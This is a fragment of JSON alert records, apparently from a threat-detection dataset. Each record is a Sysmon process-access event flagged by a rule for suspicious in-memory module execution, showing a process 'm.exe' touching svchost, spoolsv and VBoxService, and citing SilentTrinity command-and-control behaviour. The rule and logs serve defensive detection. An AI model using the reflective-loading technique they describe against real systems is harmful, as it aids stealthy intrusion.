		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1308,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8344,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.899263Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\System32\\VBoxService.exe",
		"targetprocessguid":"365ABB72-F6A1-5CC7-0000-0010E7AC0000",
		"targetprocessid":676
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1309,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8345,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.899263Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\system32\\svchost.exe",
		"targetprocessguid":"365ABB72-F6A1-5CC7-0000-00101AB00000",
		"targetprocessid":740
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1310,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8346,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.899263Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\System32\\svchost.exe",
		"targetprocessguid":"365ABB72-F6A2-5CC7-0000-00105FB40000",
		"targetprocessid":804
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1311,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8347,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.899263Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\System32\\svchost.exe",
		"targetprocessguid":"365ABB72-F6A2-5CC7-0000-001015C00000",
		"targetprocessid":872
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1312,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8348,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.899263Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\system32\\svchost.exe",
		"targetprocessguid":"365ABB72-F6A2-5CC7-0000-0010A7C40000",
		"targetprocessid":908
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1313,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8349,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.914888Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\system32\\svchost.exe",
		"targetprocessguid":"365ABB72-F6A2-5CC7-0000-001014C90000",
		"targetprocessid":956
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1314,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8350,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.914888Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\system32\\svchost.exe",
		"targetprocessguid":"365ABB72-F6A2-5CC7-0000-001012CF0000",
		"targetprocessid":1016
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1315,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8351,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.914888Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\system32\\svchost.exe",
		"targetprocessguid":"365ABB72-F6A2-5CC7-0000-0010F9D80000",
		"targetprocessid":1148
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1316,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8352,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.914888Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\System32\\spoolsv.exe",
		"targetprocessguid":"365ABB72-F6A2-5CC7-0000-00100EED0000",
		"targetprocessid":1288
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1317,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8353,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.914888Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\system32\\svchost.exe",
		"targetprocessguid":"365ABB72-F6A2-5CC7-0000-0010B8F20000",
		"targetprocessid":1328
	},
